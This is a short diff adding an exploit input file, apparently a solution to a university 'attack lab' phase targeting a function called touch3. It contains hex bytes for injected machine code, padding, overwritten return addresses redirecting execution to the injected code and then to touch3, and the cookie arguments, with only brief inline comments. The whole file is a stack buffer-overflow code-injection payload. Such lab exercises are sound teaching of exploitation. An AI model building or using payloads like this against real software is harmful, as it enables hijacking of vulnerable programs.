@@ -1,0 +1,14 @@
+/* Injected code */
+48 8d 7c 24 18 /* leaq 24(rsp) rdi first argument which is char pointer to string value of cookie */
+48 8d 74 24 08 /* leaq 8(rsp) rsi second argument which is short array of cookie */
+c3 /* ret */
+/* Padding */
+ 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* Return address: make it point to Injected code */
+e8 99 66 55 00 00 00 00
+/* Return address: touch3 */
+2f 29 40 00 00 00 00 00
+/* Argument2 short array should be 16 bytes */
+03 00 0c 00 01 00 0e 00 0f 00 0f 00 04 00 05 00
+/* Argument1 char array */
+33 63 31 65 66 66 34 35 00
